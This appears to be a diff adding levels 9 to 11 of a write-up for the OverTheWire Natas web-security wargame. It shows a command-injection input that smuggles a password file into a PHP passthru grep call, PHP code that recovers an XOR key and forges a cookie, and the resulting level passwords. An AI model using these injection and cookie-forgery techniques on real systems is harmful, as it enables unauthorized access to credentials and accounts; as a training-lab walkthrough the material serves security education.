@@ -172,3 +172,97 @@ W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 ```
 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
 ```
+## Level 9 - 10
+* http://natas10.natas.labs.overthewire.org
+* view source code
+
+![](https://i.imgur.com/mjQSO5O.png)
+* origin
+```
+passthru("grep -i $key dictionary.txt");
+```
+* input
+```
+'' /etc/natas_webpass/natas11
+```
+* inject result
+```
+passthru("grep -i '' /etc/natas_webpass/natas11 dictionary.txt");
+```
+
+![](https://i.imgur.com/S3H3Z1h.png)
+* password
+```
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+```
+## Level 10 - 11
+* http://natas11.natas.labs.overthewire.org
+* view source code
+
+![](https://i.imgur.com/3HFGIyZ.png)
+
+* xor encrypt
+```
+cipher_txt = plain_txt ^ key
+plain_txt = cipher_txt ^ key
+key = plain_txt ^ cipher_txt
+```
+* prepare plain and cipher txt
+```
+// base64 decode cookie as cipher txt
+base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"); 
+
+// json encode default data as plain txt
+json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff");)
+```
+* get key
+```
+<?php
+function xor_encrypt() {
+    $key = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D");
+    $text = json_encode(array( "showpassword"=>"no","bgcolor"=>"#ffffff"));
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+echo xor_encrypt();
+?>
+```
+```
+qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+```
+* get new cookie
+```
+<?php
+function xor_encrypt() {
+    $key = "qw8J";
+    $text = json_encode(array("showpassword"=>"yes","bgcolor"=>"#ffffff"));
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+echo base64_encode(xor_encrypt());
+?>
+```
+```
+ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+```
+* set new cookie and refresh page
+
+![](https://i.imgur.com/R7ymqSF.png)
+* password
+```
+EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+```
